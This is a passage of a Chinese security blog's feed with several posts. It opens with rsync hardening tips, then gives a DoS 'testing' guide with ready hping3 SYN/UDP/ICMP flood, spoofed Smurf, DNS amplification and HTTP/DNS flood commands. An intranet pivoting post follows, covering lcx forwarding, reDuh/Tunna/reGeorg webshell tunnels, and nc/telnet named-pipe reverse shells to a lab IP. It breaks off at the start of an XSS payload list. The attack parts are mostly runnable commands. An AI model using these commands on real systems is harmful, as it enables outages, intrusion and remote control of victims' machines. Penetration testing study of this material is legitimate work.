<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line">iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</div></pre></td></tr></table></figure>
<p>除此之外rsyncd.conf中的hosts allow也可以设置只允许来源ip。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hosts allow = X.X.X.X #允许访问的IP</div></pre></td></tr></table></figure>
<h3 id="添加用户口令"><a href="#添加用户口令" class="headerlink" title="添加用户口令"></a>添加用户口令</h3><p>添加rsync用户权限访问，注意配置的是rsyncd.conf中的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码</div><div class="line">auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。</div></pre></td></tr></table></figure>
<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-161.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-161.html</a><br><a href="http://www.91ri.org/11093.html" target="_blank" rel="external">http://www.91ri.org/11093.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈ddos的测试方法</title>
    <link href="http://uknowsec.cn/posts/skill/%E6%B5%85%E8%B0%88ddos%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html"/>
    <id>http://uknowsec.cn/posts/skill/浅谈ddos的测试方法.html</id>
    <published>2017-07-12T06:22:32.000Z</published>
    <updated>2017-07-13T01:00:54.056Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p>DOS（denial of service–拒绝服务）攻击的目的是使服务正常功能不可用。不像其他类型的攻击的目的是获取敏感信息，Dos攻击是不会威胁到敏感信息而是使合法用户不能使用服务。有时候Dos在其他攻击中也会存在一定的作用，比如使web应用防火墙拒绝服务，从而绕过防火墙。</p>
<h2 id="DOS与DDOS的区别"><a href="#DOS与DDOS的区别" class="headerlink" title="DOS与DDOS的区别"></a>DOS与DDOS的区别</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
<h2 id="DOS的类型"><a href="#DOS的类型" class="headerlink" title="DOS的类型"></a>DOS的类型</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos.jpg" alt=""></p>
<h2 id="网络和传输层攻击"><a href="#网络和传输层攻击" class="headerlink" title="网络和传输层攻击"></a>网络和传输层攻击</h2><p>这种攻击方式通常是向服务器发送恶意流量，尽可能消耗服务器的资源来达到拒绝服务的目的。</p>
<h3 id="TCP-SYN-floods"><a href="#TCP-SYN-floods" class="headerlink" title="TCP SYN floods"></a>TCP SYN floods</h3><p>SYN洪水攻击在传输层，为了更好的理解这种类型的攻击，我们需要先了解TCP的三次握手。</p>
<p>先来看张图如下：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos1.jpg" alt=""></p>
<p>对照上图来理解一下：</p>
<p>第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</p>
<p>第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 完成了三次握手，客户端和服务器端就可以开始传送数据。</p>
<p>如果攻击者发送足够的SYN数据包，因为服务器的并发TCP连接数量有限所以会导致服务器没有更多的资源可用。 如果服务器达到限制，在现有的处于SYN-RCVD状态的连接超时之前则不能在建立新的连接，这就造成了拒绝服务攻击。</p>
<p>SYN洪水攻击测试工具，我们可以用hping3，下载地址：<a href="http://www.hping.org/hping3.html" target="_blank" rel="external">http://www.hping.org/hping3.html</a></p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 简单例子： hping3 -S --flood -V -p TARGET_PORT TARGET_SITE</div><div class="line"></div><div class="line">2 随机源IP： hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE</div></pre></td></tr></table></figure>
<h3 id="UDP-floods"><a href="#UDP-floods" class="headerlink" title="UDP floods"></a>UDP floods</h3><p>UDP协议是无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p>
<p>由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击的原理是通过伪造的IP向目标服务器发送大量的UDP数据包，服务器在接收到数据包后无法处理每一条请求，并且通过向服务器发送ICMP “destination unreachable”来消耗其带宽。</p>
<p>测试工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 hping3 命令：hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP</div><div class="line"></div><div class="line">2 loic 下载地址： https://sourceforge.net/projects/loic/</div></pre></td></tr></table></figure>
<h3 id="TCP-FIN-Flood"><a href="#TCP-FIN-Flood" class="headerlink" title="TCP FIN Flood"></a>TCP FIN Flood</h3><p>这种FIM标志的数据包只有在TCP建立连接之后才会被接受，如果没有建立TCP连接，那么这个标志的数据包将会被简单的删除处理。</p>
<p>如果攻击者只是在没有建立TCP连接的情况下对服务器进行泛洪攻击，那么FIN数据包将会别丢弃，但是服务器还是会分配一些资源来查看数据包防止冗余。</p>
<p>这种攻击很容易被实现。</p>
<p>测试工具：hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="TCP-RST-Flood"><a href="#TCP-RST-Flood" class="headerlink" title="TCP RST Flood"></a>TCP RST Flood</h3><p>TCP中的RST包的意思是立即断开连接，当连接出错需要停止掉的时候非常有用。</p>
<p>如果攻击者能够以某种方式查看从源到目的地的流量，则可以发送具有适当值的RST报文（源IP，目的IP，源端口，目的端口，序列号等），该报文将断开源和目的地之间的TCP连接。 这也是一种拒绝服务的方式。</p>
<p>RST泛洪的测试工具也是hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="PUSH-and-ACK-Flood"><a href="#PUSH-and-ACK-Flood" class="headerlink" title="PUSH and ACK Flood"></a>PUSH and ACK Flood</h3><p>通过大量的PUSH和ACK泛洪可以是服务器停止对正常用户的请求进行响应。</p>
<p>测试工具：hping3 和 LOIC</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="ICMP-and-IGMP-Floods"><a href="#ICMP-and-IGMP-Floods" class="headerlink" title="ICMP and IGMP Floods"></a>ICMP and IGMP Floods</h3><p>ICMP（Internet Control Message Protocol–Internet控制消息协议）和IGMP（Internet Group Management Protocol–Internet组管理协议）是网络层的协议类似于UDP。ICMP递送状态消息，错误报告，回答某些请求，报告路由信息，并且常用于测试网络的连通性和排查问题。IGMP是IP网络上的系统和相邻路由用来建立和维护多播组成员关系的协议。</p>
<p>ICMP and IGMP Floods类似于UDP不需要任何漏洞，只需要发送大量的ICMP或IGMP数据包，在处理每一个数据包的时候资源消耗殆尽导致拒绝服务。</p>
<p>测试工具：hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h2 id="放大攻击"><a href="#放大攻击" class="headerlink" title="放大攻击"></a>放大攻击</h2><p>利用回复包比请求包大的特点（放大流量），伪造请求包的源IP地址，将应答包引向被攻击的目标。例如：攻击者伪造源IP为目标的IP然后使用路由广播IP地址向多个IP发送消息，然后这些设备都向目标IP进行回应。如图：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos2.jpg" alt=""></p>
<p>想要使用放大攻击必须使用不需要验证源IP的无连接协议，像DNS、ICMP（ Smurf attack）、UDP（Fraggle attack）等协议。</p>
<h3 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h3><p>攻击者会选择一些中间站点作为放大器，然后发送巨大数量ICMP（ping）请求到这些中间站点的广播IP。通过这种方式，将所有的源IP改为目标的IP地址，这些中间地址将这些数据包广播到所有子网的主机。最后所有主机的回应都发回给目标。</p>
<p>测试工具:hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --icmp --spoof TARGET_IP BROADCAST_IP</div></pre></td></tr></table></figure>
<h3 id="DNS-Amplification"><a href="#DNS-Amplification" class="headerlink" title="DNS Amplification"></a>DNS Amplification</h3><p>当前许多DNS服务器支持EDNS。EDNS是DNS的一套扩大机制，RFC 2671对此有介绍。一些选择能够让DNS回复超过512字节并且仍然使用UDP，如果要求者指出它能够处理这样大的DNS查询的话。攻击者已经利用这种方法产生了大量的通讯。通过发送一个60个字节的查询来获取一个大约4000个字节的记录，攻击者能够把通讯量放大66倍。一些这种性质的攻击已经产生了 每秒钟许多GB的通讯量，对于某些目标的攻击甚至超过了每秒钟10GB的通讯量。<br>下面看两个图，正常的查询:</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos3.jpg" alt=""></p>
<p>下面是放大攻击的图：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos4.jpg" alt=""></p>
<p>对比上面的连个图，发下放大攻击之后有大量的数据查询后的响应数据包返回给受害者的机器，这样就造成了对受害者的拒绝服务攻击。</p>
<p>测试工具：Tsunami</p>
<p>下载地址： <a href="https://www.infosec-ninjas.com/tsunami" target="_blank" rel="external">https://www.infosec-ninjas.com/tsunami</a></p>
<p>测试命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 收集dns服务器 ./tsunami -o recursive_dns.txt -l 4 -e 172.0.0.0/8</div><div class="line"></div><div class="line">2 对目标进行攻击 ./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt</div></pre></td></tr></table></figure>
<h3 id="Fraggle-Attack"><a href="#Fraggle-Attack" class="headerlink" title="Fraggle Attack"></a>Fraggle Attack</h3><p>攻击者向UDP端点发送大量的欺骗UDP洪促使这些端口回应目标。</p>
<h2 id="应用层攻击"><a href="#应用层攻击" class="headerlink" title="应用层攻击"></a>应用层攻击</h2><p>应用层攻击也叫第七层攻击，可以实行DoS和DDoS攻击，这种类型的攻击是基于模仿人的行为。</p>
<p>可能被利用的协议包括HTTP、HTTPS、DNS、SMTP、FTP、VOIP和其他的应用协议</p>
<h3 id="HTTP泛洪"><a href="#HTTP泛洪" class="headerlink" title="HTTP泛洪"></a>HTTP泛洪</h3><p>HTTP泛洪是应用层攻击中最常见的攻击方式。</p>
<p>这种类型的攻击可以尝试使用HTTP GET或者POST方式向服务器发出请求。通常来说需要多个电脑同时发出请求。</p>
<p>测试工具：</p>
<p>1 LOIC</p>
<p>2 hulk <a href="http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/" target="_blank" rel="external">http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令:python hulk.py -site http://TARGET.com/test/</div></pre></td></tr></table></figure>
<p>3 Apache JMeter <a href="https://jmeter.apache.org/" target="_blank" rel="external">https://jmeter.apache.org/</a></p>
<h3 id="DNS泛洪"><a href="#DNS泛洪" class="headerlink" title="DNS泛洪"></a>DNS泛洪</h3><p>DNS泛洪像其他洪水攻击一样，DNS泛宏攻击的目的是向DNS应用发送大量DNS请求。DNS服务器不堪重负，无法处理来自其他用户的所有合法请求。</p>
<p>测试工具：</p>
<p>1 mz <a href="http://www.perihel.at/sec/mz/" target="_blank" rel="external">http://www.perihel.at/sec/mz/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：mz -A rand -B TARGET_DNS_SERVER -t dns &quot;q=pentest.blog&quot; -c 10000000</div></pre></td></tr></table></figure>
<p>2 netstressng <a href="https://sourceforge.net/projects/netstressng/" target="_blank" rel="external">https://sourceforge.net/projects/netstressng/</a></p>
<p>命令：netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53</p>
<h3 id="Low和Slow攻击"><a href="#Low和Slow攻击" class="headerlink" title="Low和Slow攻击"></a>Low和Slow攻击</h3><p>这个攻击不像其他的泛洪攻击，他不需要大量的数据流量。这种类型的攻击针对的是应用程序和服务器资源。</p>
<p>这种方式很难被检测，因为其流量跟正常流量没什么两样。</p>
<p>测试工具：<a href="https://github.com/llaera/slowloris.pl" target="_blank" rel="external">https://github.com/llaera/slowloris.pl</a></p>
<p>这个工具的原理就是通过打开多个连接并保持连接，直到服务器无法处理跟多的http请求，导致拒绝服务。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里说了这么多关于拒绝服务的方式，我知道这些内容并不是很全，而且解释的也比较简单，没有深入去解释各种协议，这些基础的东西就需要大家自行去研究学习。这里只是做一个简要介绍做个笔记。里面涉及的攻击就只能请大家自行测试了 。</p>
<p>原文链接：<a href="https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw" target="_blank" rel="external">https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透中转发工具总结</title>
    <link href="http://uknowsec.cn/posts/notes/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/notes/内网渗透中转发工具总结.html</id>
    <published>2017-07-11T07:03:36.000Z</published>
    <updated>2017-07-12T02:53:33.949Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="LCX转发"><a href="#LCX转发" class="headerlink" title="LCX转发"></a>LCX转发</h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
<p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p>
<p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>
<p>首先在本地进行监听，监听51端口并转发到33891端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe -listen 51 33891</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx1.png" alt=""></p>
<p>内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口</p>
<p>将内网(192.168.1.128)的3389端口转发到公网(192.168.1.110)的51端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe –slave 192.168.1.110 51 192.168.1.128 3389</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx2.png" alt=""></p>
<p>远程桌面访问33891端口</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx3.png" alt=""></p>
<h2 id="NC转发"><a href="#NC转发" class="headerlink" title="NC转发"></a>NC转发</h2><p>本机：192.168.1.125<br>靶机：192.168.1.128</p>
<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>在靶机上<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc1.png" alt=""></p>
<p>在本机上操作，并成功获得一个远程机器的shell<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc2.png" alt=""></p>
<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>在本机运行上<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc3.png" alt=""></p>
<p>在远程机器上，然后成功之后，在本地机器上获得一个远程机器的cmdshell<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc4.png" alt=""></p>
<h2 id="Redduh内网反弹"><a href="#Redduh内网反弹" class="headerlink" title="Redduh内网反弹"></a>Redduh内网反弹</h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
<p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。</p>
<p>这里我们以php网站为例，首先将php文件上传到服务器端。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reDuh1.png" alt=""></p>
<p>浏览器中访问上传的webshell，提示以下内容说明解析成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/reDuh2.png" alt=""></p>
<p>用客户端连接服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar reDuhClient.jar http://192.168.1.125/reDuh.php</div></pre></td></tr></table></figure></p>
<p>本地连接1010端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc.exe -vv localhost 1010</div><div class="line">[createTunnel]1235:127.0.0.1:3389</div></pre></td></tr></table></figure></p>
<p>远程登录<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
<h2 id="Tunna内网反弹"><a href="#Tunna内网反弹" class="headerlink" title="Tunna内网反弹"></a>Tunna内网反弹</h2><p>靶机：192.168.1.137<br>本机：192.168.1.110</p>
<p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna0.png" alt=""></p>
<p>这里使用php网站进行测试，上传php后门<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python proxy.py -u http://192.168.1.137/conn.php -l 1234 -r 3389 -v –s</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/tunna4.png" alt=""></p>
<p>远程连接<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
<h2 id="Linux系统通过nc反弹shell"><a href="#Linux系统通过nc反弹shell" class="headerlink" title="Linux系统通过nc反弹shell"></a>Linux系统通过nc反弹shell</h2><p>本机：192.168.1.117<br>靶机：192.168.1.116</p>
<p>首先，攻击端进行监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -lvnp 2333</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc1.png" alt=""></p>
<p>服务端执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.117 2333 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc3.png" alt=""></p>
<p>执行命令，查看发现反弹成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc2.png" alt=""></p>
<h2 id="内置命令反弹"><a href="#内置命令反弹" class="headerlink" title="内置命令反弹"></a>内置命令反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -lvnp 2333</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc1.png" alt=""></p>
<p>服务器端执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p</div><div class="line">telnet 192.168.1.117 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc4.png" alt=""></p>
<p>反弹成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc2.png" alt=""></p>
<h2 id="reGeorg-proxifier正向代理"><a href="#reGeorg-proxifier正向代理" class="headerlink" title="reGeorg+proxifier正向代理"></a>reGeorg+proxifier正向代理</h2><p>靶机：192.168.1.117<br>本机：192.168.1.110</p>
<p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。</p>
<p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -p 8888 -u http://192.168.1.117/tunnel.php</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg2.png" alt=""></p>
<p>将proxifier打开，在Proxy Server中这样配置<br><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg22.png" alt=""></p>
<p>右击“mstsc.exe”，选择“proxifier”-》proxy socks5 127.0.0.1进行远程连接<br><img src="http://xianzhi.aliyun.com/forum/attachment/Mon_1703/4_1369089561206498_634c5121ba88660.jpg" alt=""></p>
<p>输入内网ip，192.168.1.117</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg4.png" alt=""></p>
<p>可以看到reGeorg的状态，和proxifier的状态<br><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg3.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg5.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>xss payload 大全</title>
    <link href="http://uknowsec.cn/posts/notes/xss-payload-%E5%A4%A7%E5%85%A8.html"/>
    <id>http://uknowsec.cn/posts/notes/xss-payload-大全.html</id>
    <published>2017-07-11T05:20:00.000Z</published>
    <updated>2017-07-11T05:20:37.482Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div 